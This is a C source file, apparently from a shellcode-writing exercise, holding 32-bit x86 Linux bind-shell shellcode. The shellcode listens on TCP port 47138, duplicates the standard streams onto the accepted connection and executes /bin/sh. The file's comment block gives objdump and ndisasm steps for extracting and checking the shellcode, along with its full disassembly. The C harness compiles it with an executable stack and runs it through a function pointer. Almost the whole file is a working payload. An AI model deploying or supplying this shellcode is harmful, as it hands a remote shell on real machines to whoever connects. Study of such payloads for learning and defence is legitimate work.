#include <stdio.h>
#include <string.h>

/*
Get shellcode from disassembly dump:
$ echo `objdump -d shell_bind_tcp  | grep -v file | grep '[0-9a-f]:' | cut  -f 2 ` | sed 's/ /\\x/g' | sed 's/^/\\x/g'
\x31\xc0\x31\xdb\x31\xc9\x51\xb1\x06\x51\x31\xc9\xb1\x01\x51\x31\xc9\xb1\x02\x51\x89\xe1\x31\xdb\xb3\x01\x6a\x66\x58\xcd\x80\x89\xc2\x31\xc9\x51\x66\x68\x22\xb8\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\x31\xdb\xb3\x02\x31\xc0\xb0\x66\xcd\x80\x6a\x01\x52\x89\xe1\x6a\x04\x5b\x6a\x66\x58\xcd\x80\x31\xc9\x51\x51\x52\x89\xe1\x6a\x05\x5b\x6a\x66\x58\xcd\x80\x89\xc2\x6a\x02\x59\x89\xd3\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80

Check for NULL bytes in shellcode:
$ objdump -d shell_bind_tcp | grep 00

Check instructions:
$ echo -ne "\x31\xc0\x31\xdb\x31\xc9\x51\xb1\x06\x51\x31\xc9\xb1\x01\x51\x31\xc9\xb1\x02\x51\x89\xe1\x31\xdb\xb3\x01\x6a\x66\x58\xcd\x80\x89\xc2\x31\xc9\x51\x66\x68\x22\xb8\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\x31\xdb\xb3\x02\x31\xc0\xb0\x66\xcd\x80\x6a\x01\x52\x89\xe1\x6a\x04\x5b\x6a\x66\x58\xcd\x80\x31\xc9\x51\x51\x52\x89\xe1\x6a\x05\x5b\x6a\x66\x58\xcd\x80\x89\xc2\x6a\x02\x59\x89\xd3\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" | ndisasm -b 32 -
00000000  31C0              xor eax,eax
00000002  31DB              xor ebx,ebx
00000004  31C9              xor ecx,ecx
00000006  51                push ecx
00000007  B106              mov cl,0x6
00000009  51                push ecx
0000000A  31C9              xor ecx,ecx
0000000C  B101              mov cl,0x1
0000000E  51                push ecx
0000000F  31C9              xor ecx,ecx
00000011  B102              mov cl,0x2
00000013  51                push ecx
00000014  89E1              mov ecx,esp
00000016  31DB              xor ebx,ebx
00000018  B301              mov bl,0x1
0000001A  6A66              push byte +0x66
0000001C  58                pop eax
0000001D  CD80              int 0x80
0000001F  89C2              mov edx,eax
00000021  31C9              xor ecx,ecx
00000023  51                push ecx
00000024  666822B8          push word 0xb822
00000028  666A02            push word 0x2
0000002B  89E1              mov ecx,esp
0000002D  6A10              push byte +0x10
0000002F  51                push ecx
00000030  52                push edx
00000031  89E1              mov ecx,esp
00000033  31DB              xor ebx,ebx
00000035  B302              mov bl,0x2
00000037  31C0              xor eax,eax
00000039  B066              mov al,0x66
0000003B  CD80              int 0x80
0000003D  6A01              push byte +0x1
0000003F  52                push edx
00000040  89E1              mov ecx,esp
00000042  6A04              push byte +0x4
00000044  5B                pop ebx
00000045  6A66              push byte +0x66
00000047  58                pop eax
00000048  CD80              int 0x80
0000004A  31C9              xor ecx,ecx
0000004C  51                push ecx
0000004D  51                push ecx
0000004E  52                push edx
0000004F  89E1              mov ecx,esp
00000051  6A05              push byte +0x5
00000053  5B                pop ebx
00000054  6A66              push byte +0x66
00000056  58                pop eax
00000057  CD80              int 0x80
00000059  89C2              mov edx,eax
0000005B  6A02              push byte +0x2
0000005D  59                pop ecx
0000005E  89D3              mov ebx,edx
00000060  B03F              mov al,0x3f
00000062  CD80              int 0x80
00000064  49                dec ecx
00000065  79F9              jns 0x60
00000067  31C0              xor eax,eax
00000069  50                push eax
0000006A  682F2F7368        push dword 0x68732f2f
0000006F  682F62696E        push dword 0x6e69622f
00000074  89E3              mov ebx,esp
00000076  50                push eax
00000077  89E2              mov edx,esp
00000079  53                push ebx
0000007A  89E1              mov ecx,esp
0000007C  B00B              mov al,0xb
0000007E  CD80              int 0x80

Add to shellcode skeleton and compile:
$ gcc -o shellcode -z execstack shellcode.c

Test shellcode:
$ ./shellcode 
Shellcode Length:  128

*/

unsigned char code[] = \
    "\x31\xc0\x31\xdb\x31\xc9\x51\xb1\x06\x51\x31\xc9\xb1\x01\x51\x31\xc9\xb1\x02\x51\x89\xe1\x31\xdb\xb3\x01\x6a\x66\x58\xcd\x80\x89\xc2\x31\xc9\x51\x66\x68\x22\xb8\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\x31\xdb\xb3\x02\x31\xc0\xb0\x66\xcd\x80\x6a\x01\x52\x89\xe1\x6a\x04\x5b\x6a\x66\x58\xcd\x80\x31\xc9\x51\x51\x52\x89\xe1\x6a\x05\x5b\x6a\x66\x58\xcd\x80\x89\xc2\x6a\x02\x59\x89\xd3\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

// Function pointer
typedef int (*func_ptr)();

void main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	func_ptr ret = (func_ptr) code;

	ret();
}
